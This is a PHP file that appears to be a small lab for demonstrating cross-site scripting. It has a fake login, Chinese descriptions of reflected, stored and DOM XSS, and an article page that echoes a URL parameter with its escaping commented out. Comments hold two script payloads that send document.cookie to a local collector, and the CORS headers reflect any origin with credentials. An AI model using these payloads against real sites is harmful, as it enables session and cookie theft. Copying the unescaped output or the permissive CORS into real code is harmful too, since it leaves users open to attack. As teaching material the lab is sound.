<?php
/*
 * @Author: lh@metgs.com
 * @Date: 2023-05-25 12:42:59
 * @LastEditors: lh@metgs.com
 * @LastEditTime: 2023-05-25 15:14:16
 * @Description: ...
 */

$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';
header('Access-Control-Allow-Origin:' . $origin);
header('Access-Control-Allow-Methods:POST,GET');
header('Access-Control-Allow-Credentials: true');

$url = $_SERVER['PATH_INFO'] ?? $_SERVER['REQUEST_URI'];

$login = $_COOKIE['uid'] ?? FALSE;

$urls = ['/', '/login'];

if (!in_array($url, $urls) && !$login) {
  header("location:/");
}

if ($url == '/login') {
  setcookie("uid", "thisismyuid");
  setcookie("sss", "sasas");
  header("location:/dashbord");
}

if ($url == '/') {
  if ($login) {
    header("location:/dashbord");
  } else {
    echo '<form action="/login" id="login" method="post">
    <div>
      <label>
        用户名：
        <input type="text" >
      </label>
    </div>
    <div>
      <label>
        密码:
        <input type="password" >
      </label>
    </div>
    <div>
      <button type="submit">登录</button>
    </div>
  </form>';
  }
}

$articles = [
  '1' => '当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自"可信任"的服务器，所以会执行这段脚本。',
  '2' => '注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。',
  '3' => '通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。'
];

// <script>document.location=`http://localhost:1113?cookie=${document.cookie}`</script>
// <script>var a = new Image;a.src=`http://localhost:1113?cookie=${document.cookie}`;document.body.appendChild(a)</script>
if ($url == '/dashbord') {
  echo '<p>XSS漏洞类型：</p>
    <ul>
      <li><a href="/article?id=1&name=反射型XSS">反射型XSS</a></li>
      <li><a href="/article?id=2&name=存储型XSS">存储型XSS</a></li>
      <li><a href="/article?id=3&name=DOM XSS">DOM XSS</a></li>
    </ul>
  ';
}


if ($url == '/article') {
  // $title = htmlspecialchars($_GET['name']);
  // $content = htmlspecialchars($articles[$_GET['id']]);
  $title = $_GET['name'];
  $content = $articles[$_GET['id']];
  echo "
    <h1>{$title}</h1>
    <p>
      {$content}
    </p>
  ";
}
